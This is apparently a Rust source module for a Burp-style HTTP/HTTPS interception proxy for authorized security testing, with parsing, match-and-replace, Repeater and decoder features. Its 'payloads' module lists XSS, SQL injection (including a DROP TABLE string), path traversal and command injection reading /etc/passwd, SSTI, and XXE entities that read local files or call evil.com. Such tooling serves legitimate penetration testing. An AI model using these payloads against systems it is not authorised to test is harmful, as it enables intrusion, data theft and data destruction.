//! MITM Proxy (Burp Suite CLI Alternative)
//!
//! HTTP/HTTPS interception proxy for authorized security testing.
//! Supports request/response modification, replay, and analysis.

use crate::{Error, Result};
use std::collections::HashMap;
use std::sync::{Arc, RwLock};
use serde::{Serialize, Deserialize};

/// MITM Proxy configuration
#[derive(Debug, Clone)]
pub struct ProxyConfig {
    pub listen_addr: String,
    pub listen_port: u16,
    pub upstream_proxy: Option<String>,
    pub intercept_tls: bool,
    pub ca_cert_path: Option<String>,
    pub ca_key_path: Option<String>,
    pub scope: Vec<ScopeRule>,
    pub intercept_mode: InterceptMode,
}

impl Default for ProxyConfig {
    fn default() -> Self {
        Self {
            listen_addr: "127.0.0.1".to_string(),
            listen_port: 8080,
            upstream_proxy: None,
            intercept_tls: true,
            ca_cert_path: None,
            ca_key_path: None,
            scope: vec![ScopeRule::all()],
            intercept_mode: InterceptMode::Passthrough,
        }
    }
}

#[derive(Debug, Clone)]
pub enum InterceptMode {
    /// Let all traffic pass through without stopping
    Passthrough,
    /// Intercept all matching requests for manual review
    InterceptAll,
    /// Intercept requests matching specific rules
    InterceptFiltered(Vec<InterceptRule>),
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScopeRule {
    pub host_pattern: String,
    pub port: Option<u16>,
    pub protocol: Option<Protocol>,
}

impl ScopeRule {
    pub fn all() -> Self {
        Self {
            host_pattern: "*".to_string(),
            port: None,
            protocol: None,
        }
    }

    pub fn host(pattern: &str) -> Self {
        Self {
            host_pattern: pattern.to_string(),
            port: None,
            protocol: None,
        }
    }

    pub fn matches(&self, host: &str, port: u16) -> bool {
        let host_matches = if self.host_pattern == "*" {
            true
        } else if self.host_pattern.starts_with('*') {
            host.ends_with(&self.host_pattern[1..])
        } else {
            host == self.host_pattern
        };

        let port_matches = self.port.map(|p| p == port).unwrap_or(true);
        host_matches && port_matches
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum Protocol {
    Http,
    Https,
}

#[derive(Debug, Clone)]
pub struct InterceptRule {
    pub method: Option<String>,
    pub url_pattern: Option<String>,
    pub header_contains: Option<(String, String)>,
    pub body_contains: Option<String>,
}

/// HTTP request representation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpRequest {
    pub id: u64,
    pub method: String,
    pub url: String,
    pub host: String,
    pub path: String,
    pub headers: HashMap<String, String>,
    pub body: Vec<u8>,
    pub tls: bool,
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

impl HttpRequest {
    /// Parse raw HTTP request
    pub fn parse(raw: &[u8]) -> Result<Self> {
        let mut headers = [httparse::EMPTY_HEADER; 64];
        let mut req = httparse::Request::new(&mut headers);

        let status = req.parse(raw)
            .map_err(|e| Error::InvalidRule(format!("Parse error: {:?}", e)))?;

        let header_len = match status {
            httparse::Status::Complete(len) => len,
            httparse::Status::Partial => return Err(Error::InvalidRule("Incomplete request".into())),
        };

        let method = req.method.unwrap_or("GET").to_string();
        let path = req.path.unwrap_or("/").to_string();

        let mut header_map = HashMap::new();
        let mut host = String::new();

        for header in req.headers.iter() {
            let name = header.name.to_lowercase();
            let value = String::from_utf8_lossy(header.value).to_string();
            if name == "host" {
                host = value.clone();
            }
            header_map.insert(name, value);
        }

        let body = raw[header_len..].to_vec();

        Ok(Self {
            id: 0,
            method,
            url: format!("http://{}{}", host, path),
            host,
            path,
            headers: header_map,
            body,
            tls: false,
            timestamp: chrono::Utc::now(),
        })
    }

    /// Convert to raw HTTP
    pub fn to_raw(&self) -> Vec<u8> {
        let mut raw = format!("{} {} HTTP/1.1\r\n", self.method, self.path);

        for (name, value) in &self.headers {
            raw.push_str(&format!("{}: {}\r\n", name, value));
        }

        raw.push_str("\r\n");
        let mut bytes = raw.into_bytes();
        bytes.extend_from_slice(&self.body);
        bytes
    }

    /// Get header value
    pub fn header(&self, name: &str) -> Option<&str> {
        self.headers.get(&name.to_lowercase()).map(|s| s.as_str())
    }

    /// Set header
    pub fn set_header(&mut self, name: &str, value: &str) {
        self.headers.insert(name.to_lowercase(), value.to_string());
    }

    /// Remove header
    pub fn remove_header(&mut self, name: &str) {
        self.headers.remove(&name.to_lowercase());
    }
}

/// HTTP response representation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HttpResponse {
    pub id: u64,
    pub request_id: u64,
    pub status_code: u16,
    pub status_text: String,
    pub headers: HashMap<String, String>,
    pub body: Vec<u8>,
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

impl HttpResponse {
    /// Parse raw HTTP response
    pub fn parse(raw: &[u8]) -> Result<Self> {
        let mut headers = [httparse::EMPTY_HEADER; 64];
        let mut resp = httparse::Response::new(&mut headers);

        let status = resp.parse(raw)
            .map_err(|e| Error::InvalidRule(format!("Parse error: {:?}", e)))?;

        let header_len = match status {
            httparse::Status::Complete(len) => len,
            httparse::Status::Partial => return Err(Error::InvalidRule("Incomplete response".into())),
        };

        let status_code = resp.code.unwrap_or(0);
        let status_text = resp.reason.unwrap_or("").to_string();

        let mut header_map = HashMap::new();
        for header in resp.headers.iter() {
            let name = header.name.to_lowercase();
            let value = String::from_utf8_lossy(header.value).to_string();
            header_map.insert(name, value);
        }

        let body = raw[header_len..].to_vec();

        Ok(Self {
            id: 0,
            request_id: 0,
            status_code,
            status_text,
            headers: header_map,
            body,
            timestamp: chrono::Utc::now(),
        })
    }

    /// Convert to raw HTTP
    pub fn to_raw(&self) -> Vec<u8> {
        let mut raw = format!("HTTP/1.1 {} {}\r\n", self.status_code, self.status_text);

        for (name, value) in &self.headers {
            raw.push_str(&format!("{}: {}\r\n", name, value));
        }

        raw.push_str("\r\n");
        let mut bytes = raw.into_bytes();
        bytes.extend_from_slice(&self.body);
        bytes
    }

    /// Get header value
    pub fn header(&self, name: &str) -> Option<&str> {
        self.headers.get(&name.to_lowercase()).map(|s| s.as_str())
    }

    /// Set header
    pub fn set_header(&mut self, name: &str, value: &str) {
        self.headers.insert(name.to_lowercase(), value.to_string());
    }
}

/// Proxy history entry
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct HistoryEntry {
    pub request: HttpRequest,
    pub response: Option<HttpResponse>,
    pub modified: bool,
    pub notes: String,
    pub tags: Vec<String>,
}

/// Intercepted request/response for manual review
#[derive(Debug)]
pub struct InterceptedItem {
    pub item_type: InterceptedType,
    pub original: Vec<u8>,
    pub modified: Option<Vec<u8>>,
}

#[derive(Debug)]
pub enum InterceptedType {
    Request(HttpRequest),
    Response(HttpResponse),
}

/// Match and Replace rule
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MatchReplaceRule {
    pub name: String,
    pub enabled: bool,
    pub match_type: MatchType,
    pub match_pattern: String,
    pub replace_with: String,
    pub regex: bool,
    pub scope: Option<ScopeRule>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum MatchType {
    RequestHeader,
    RequestBody,
    ResponseHeader,
    ResponseBody,
    Url,
}

impl MatchReplaceRule {
    pub fn apply_request(&self, request: &mut HttpRequest) {
        if !self.enabled {
            return;
        }

        match self.match_type {
            MatchType::RequestHeader => {
                for (name, value) in request.headers.iter_mut() {
                    if self.regex {
                        if let Ok(re) = regex::Regex::new(&self.match_pattern) {
                            *value = re.replace_all(value, &self.replace_with).to_string();
                        }
                    } else if value.contains(&self.match_pattern) {
                        *value = value.replace(&self.match_pattern, &self.replace_with);
                    }
                }
            }
            MatchType::RequestBody => {
                if let Ok(body_str) = String::from_utf8(request.body.clone()) {
                    let new_body = if self.regex {
                        if let Ok(re) = regex::Regex::new(&self.match_pattern) {
                            re.replace_all(&body_str, &self.replace_with).to_string()
                        } else {
                            body_str
                        }
                    } else {
                        body_str.replace(&self.match_pattern, &self.replace_with)
                    };
                    request.body = new_body.into_bytes();
                }
            }
            MatchType::Url => {
                request.url = if self.regex {
                    if let Ok(re) = regex::Regex::new(&self.match_pattern) {
                        re.replace_all(&request.url, &self.replace_with).to_string()
                    } else {
                        request.url.clone()
                    }
                } else {
                    request.url.replace(&self.match_pattern, &self.replace_with)
                };
            }
            _ => {}
        }
    }

    pub fn apply_response(&self, response: &mut HttpResponse) {
        if !self.enabled {
            return;
        }

        match self.match_type {
            MatchType::ResponseHeader => {
                for (name, value) in response.headers.iter_mut() {
                    if self.regex {
                        if let Ok(re) = regex::Regex::new(&self.match_pattern) {
                            *value = re.replace_all(value, &self.replace_with).to_string();
                        }
                    } else if value.contains(&self.match_pattern) {
                        *value = value.replace(&self.match_pattern, &self.replace_with);
                    }
                }
            }
            MatchType::ResponseBody => {
                if let Ok(body_str) = String::from_utf8(response.body.clone()) {
                    let new_body = if self.regex {
                        if let Ok(re) = regex::Regex::new(&self.match_pattern) {
                            re.replace_all(&body_str, &self.replace_with).to_string()
                        } else {
                            body_str
                        }
                    } else {
                        body_str.replace(&self.match_pattern, &self.replace_with)
                    };
                    response.body = new_body.into_bytes();
                }
            }
            _ => {}
        }
    }
}

/// Intruder-style payload positions
#[derive(Debug, Clone)]
pub struct IntruderConfig {
    pub base_request: HttpRequest,
    pub positions: Vec<PayloadPosition>,
    pub payloads: Vec<PayloadSet>,
    pub attack_type: AttackType,
}

#[derive(Debug, Clone)]
pub struct PayloadPosition {
    pub name: String,
    pub start: usize,
    pub end: usize,
    pub location: PayloadLocation,
}

#[derive(Debug, Clone)]
pub enum PayloadLocation {
    Url,
    Header(String),
    Body,
    Cookie,
}

#[derive(Debug, Clone)]
pub struct PayloadSet {
    pub name: String,
    pub payloads: Vec<String>,
}

#[derive(Debug, Clone)]
pub enum AttackType {
    /// Single payload set, one position at a time
    Sniper,
    /// Single payload set, all positions simultaneously
    Battering,
    /// Multiple payload sets, cycle through each
    Pitchfork,
    /// Multiple payload sets, all combinations
    ClusterBomb,
}

/// Repeater - manual request replay
pub struct Repeater {
    history: Vec<RepeaterEntry>,
}

#[derive(Debug, Clone)]
pub struct RepeaterEntry {
    pub request: HttpRequest,
    pub response: Option<HttpResponse>,
    pub sent_at: chrono::DateTime<chrono::Utc>,
}

impl Repeater {
    pub fn new() -> Self {
        Self { history: Vec::new() }
    }

    /// Send request and record
    pub async fn send(&mut self, request: HttpRequest) -> Result<HttpResponse> {
        // Build HTTP client request
        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .build()
            .map_err(|e| Error::Blocked(e.to_string()))?;

        let method = reqwest::Method::from_bytes(request.method.as_bytes())
            .map_err(|_| Error::InvalidRule("Invalid method".into()))?;

        let mut req_builder = client.request(method, &request.url);

        for (name, value) in &request.headers {
            req_builder = req_builder.header(name, value);
        }

        if !request.body.is_empty() {
            req_builder = req_builder.body(request.body.clone());
        }

        let resp = req_builder.send().await
            .map_err(|e| Error::Blocked(e.to_string()))?;

        let status_code = resp.status().as_u16();
        let status_text = resp.status().canonical_reason().unwrap_or("").to_string();

        let mut headers = HashMap::new();
        for (name, value) in resp.headers() {
            headers.insert(
                name.as_str().to_string(),
                value.to_str().unwrap_or("").to_string(),
            );
        }

        let body = resp.bytes().await
            .map_err(|e| Error::Blocked(e.to_string()))?
            .to_vec();

        let response = HttpResponse {
            id: 0,
            request_id: request.id,
            status_code,
            status_text,
            headers,
            body,
            timestamp: chrono::Utc::now(),
        };

        self.history.push(RepeaterEntry {
            request,
            response: Some(response.clone()),
            sent_at: chrono::Utc::now(),
        });

        Ok(response)
    }

    /// Get history
    pub fn history(&self) -> &[RepeaterEntry] {
        &self.history
    }
}

/// Decoder/Encoder utilities (like Burp Decoder)
pub mod decoder {
    use base64::Engine;

    pub fn base64_encode(input: &[u8]) -> String {
        base64::engine::general_purpose::STANDARD.encode(input)
    }

    pub fn base64_decode(input: &str) -> Option<Vec<u8>> {
        base64::engine::general_purpose::STANDARD.decode(input).ok()
    }

    pub fn url_encode(input: &str) -> String {
        input.chars().map(|c| {
            if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '~' {
                c.to_string()
            } else {
                format!("%{:02X}", c as u8)
            }
        }).collect()
    }

    pub fn url_decode(input: &str) -> String {
        let mut result = String::new();
        let mut chars = input.chars().peekable();

        while let Some(c) = chars.next() {
            if c == '%' {
                let hex: String = chars.by_ref().take(2).collect();
                if let Ok(byte) = u8::from_str_radix(&hex, 16) {
                    result.push(byte as char);
                }
            } else if c == '+' {
                result.push(' ');
            } else {
                result.push(c);
            }
        }
        result
    }

    pub fn html_encode(input: &str) -> String {
        input.chars().map(|c| match c {
            '<' => "&lt;".to_string(),
            '>' => "&gt;".to_string(),
            '&' => "&amp;".to_string(),
            '"' => "&quot;".to_string(),
            '\'' => "&#x27;".to_string(),
            _ => c.to_string(),
        }).collect()
    }

    pub fn hex_encode(input: &[u8]) -> String {
        hex::encode(input)
    }

    pub fn hex_decode(input: &str) -> Option<Vec<u8>> {
        hex::decode(input).ok()
    }

    /// Smart decode - try multiple encodings
    pub fn smart_decode(input: &str) -> Vec<(String, String)> {
        let mut results = Vec::new();

        // Try URL decode
        let url_decoded = url_decode(input);
        if url_decoded != input {
            results.push(("URL Decoded".to_string(), url_decoded));
        }

        // Try Base64
        if let Some(decoded) = base64_decode(input) {
            if let Ok(s) = String::from_utf8(decoded) {
                results.push(("Base64 Decoded".to_string(), s));
            }
        }

        // Try Hex
        if let Some(decoded) = hex_decode(input) {
            if let Ok(s) = String::from_utf8(decoded) {
                results.push(("Hex Decoded".to_string(), s));
            }
        }

        results
    }
}

/// Common security testing payloads
pub mod payloads {
    pub fn xss_basic() -> Vec<&'static str> {
        vec![
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<body onload=alert(1)>",
        ]
    }

    pub fn sqli_basic() -> Vec<&'static str> {
        vec![
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1' OR '1'='1' --",
            "1\" OR \"1\"=\"1\" --",
            "' OR 1=1 --",
            "\" OR 1=1 --",
            "admin'--",
            "' UNION SELECT NULL--",
            "1; DROP TABLE users--",
        ]
    }

    pub fn lfi_basic() -> Vec<&'static str> {
        vec![
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/proc/self/environ",
            "php://filter/convert.base64-encode/resource=index.php",
        ]
    }

    pub fn ssti_basic() -> Vec<&'static str> {
        vec![
            "{{7*7}}",
            "${7*7}",
            "<%= 7*7 %>",
            "#{7*7}",
            "*{7*7}",
            "@(7*7)",
            "{{config}}",
            "{{self.__class__.__mro__}}",
        ]
    }

    pub fn command_injection() -> Vec<&'static str> {
        vec![
            "; id",
            "| id",
            "|| id",
            "& id",
            "&& id",
            "`id`",
            "$(id)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
        ]
    }

    pub fn xxe_basic() -> Vec<&'static str> {
        vec![
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#,
            r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>"#,
        ]
    }
}

/// Proxy history storage
pub struct ProxyHistory {
    entries: Arc<RwLock<Vec<HistoryEntry>>>,
    next_id: Arc<RwLock<u64>>,
}

impl ProxyHistory {
    pub fn new() -> Self {
        Self {
            entries: Arc::new(RwLock::new(Vec::new())),
            next_id: Arc::new(RwLock::new(1)),
        }
    }

    /// Add entry to history
    pub fn add(&self, mut request: HttpRequest, response: Option<HttpResponse>) {
        let mut id = self.next_id.write().unwrap();
        request.id = *id;
        *id += 1;

        let entry = HistoryEntry {
            request,
            response,
            modified: false,
            notes: String::new(),
            tags: Vec::new(),
        };

        self.entries.write().unwrap().push(entry);
    }

    /// Get all entries
    pub fn entries(&self) -> Vec<HistoryEntry> {
        self.entries.read().unwrap().clone()
    }

    /// Filter by host
    pub fn filter_by_host(&self, host: &str) -> Vec<HistoryEntry> {
        self.entries.read().unwrap()
            .iter()
            .filter(|e| e.request.host.contains(host))
            .cloned()
            .collect()
    }

    /// Search in requests/responses
    pub fn search(&self, query: &str) -> Vec<HistoryEntry> {
        self.entries.read().unwrap()
            .iter()
            .filter(|e| {
                e.request.url.contains(query) ||
                e.request.headers.values().any(|v| v.contains(query)) ||
                String::from_utf8_lossy(&e.request.body).contains(query) ||
                e.response.as_ref().map(|r| {
                    String::from_utf8_lossy(&r.body).contains(query)
                }).unwrap_or(false)
            })
            .cloned()
            .collect()
    }

    /// Export to file
    pub fn export_json(&self, path: &str) -> Result<()> {
        let entries = self.entries.read().unwrap();
        let json = serde_json::to_string_pretty(&*entries)
            .map_err(|e| Error::InvalidRule(e.to_string()))?;
        std::fs::write(path, json)?;
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_scope_rule() {
        let rule = ScopeRule::host("*.example.com");
        assert!(rule.matches("api.example.com", 443));
        assert!(rule.matches("www.example.com", 80));
        assert!(!rule.matches("other.com", 80));
    }

    #[test]
    fn test_decoder() {
        assert_eq!(decoder::url_encode("hello world"), "hello%20world");
        assert_eq!(decoder::url_decode("hello%20world"), "hello world");
    }
}
